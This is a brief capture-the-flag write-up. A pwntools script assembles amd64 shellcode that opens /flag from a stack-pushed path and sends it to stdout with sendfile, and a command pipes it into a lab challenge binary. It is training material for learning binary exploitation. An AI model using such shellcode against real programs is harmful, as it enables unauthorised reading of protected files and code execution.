# Basic Shellcode

#### To get the flag the file now must be opened from pointing to it in the stack.
```python
from pwn import *
import sys
context.arch = 'amd64'
asmbl = """
xor rsi, rsi ; Add a null byte to cut off the string len check from the previous challenge
push rsi ; push it on the stack
mov rdi, 0x67616c662f ; load /flag
push rdi ; push it to the stack
mov rdi, rsp ; set the pointer to the file
xor rdx, rdx ; set mode to 0
mov rax, 2 ; sys open
syscall

mov rsi, rax ; set rsi to the fd from open
mov rdi, 1 ; stdout
mov r10, 1000 ; count
xor rdx, rdx ; offset 0
mov rax, 40 ; sys sendfile
syscall

mov rax, 60 ; sys exit
xor rdi, rdi
syscall
"""

asmbly = asm(asmbl)
sys.stdout.buffer.write(asmbly)
```
--------------------------------------------------

#### Pipe it into the challenge
```python3 a.py | /challenge/binary-exploitation-basic-shellcode```
